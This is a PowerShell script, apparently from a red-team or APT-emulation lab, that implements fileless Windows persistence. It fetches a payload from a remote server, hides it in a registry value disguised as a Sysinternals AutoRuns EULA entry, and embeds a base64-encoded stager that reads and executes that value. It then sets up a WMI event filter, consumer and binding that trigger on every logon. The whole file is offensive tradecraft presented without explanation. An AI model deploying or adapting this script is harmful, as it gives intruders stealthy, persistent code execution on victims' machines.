$PayloadX = (Invoke-RestMethod -Uri "http://10.0.0.155/APT/payloadx")

$RegistryPath = "Registry::HKEY_CURRENT_USER\SOFTWARE\Sysinternals\AutoRuns"
$PayloadValueName = "EulaValue"
if (!$RegistryPath){New-Item -Path $RegistryPath -Force | Out-Null}
New-ItemProperty -Path $RegistryPath -Name $PayloadValueName -Value $PayloadX -PropertyType MultiString -Force | Out-Null

$PayloadEventConsummer = "JABSAGUAZwBpAHMAdAByAHkAUABhAHQAaAAgAD0AIAAiAFIAZQBnAGkAcwB0AHIAeQA6ADoASABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBPAEYAVABXAEEAUgBFAFwAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAXABBAHUAdABvAFIAdQBuAHMAIgA7ACAAJABQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlACAAPQAgACIARQB1AGwAYQBWAGEAbAB1AGUAIgA7ACAAJABQAGEAeQBsAG8AYQBkACAAPQAgACQAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABSAGUAZwBpAHMAdAByAHkAUABhAHQAaAAgAC0ATgBhAG0AZQAgACQAUABhAHkAbABvAGEAZABWAGEAbAB1AGUATgBhAG0AZQApAC4AJABQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlADsAIABpAGUAeAAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAUABhAHkAbABvAGEAZAApACkAKQA="


$FilterArgs = @{name='LOLOLOLOL';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"};

$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Property $FilterArgs


$ConsumerArgs = @{name='LOLOLOLOL';
                CommandLineTemplate="cmd.exe /c echo %ProcessId% >> c:\\temp\\log.txt";}


$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Property $ConsumerArgs


$FilterToConsumerArgs = @{Filter = $Filter;
						  Consumer = $Consumer;}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Property $FilterToConsumerArgs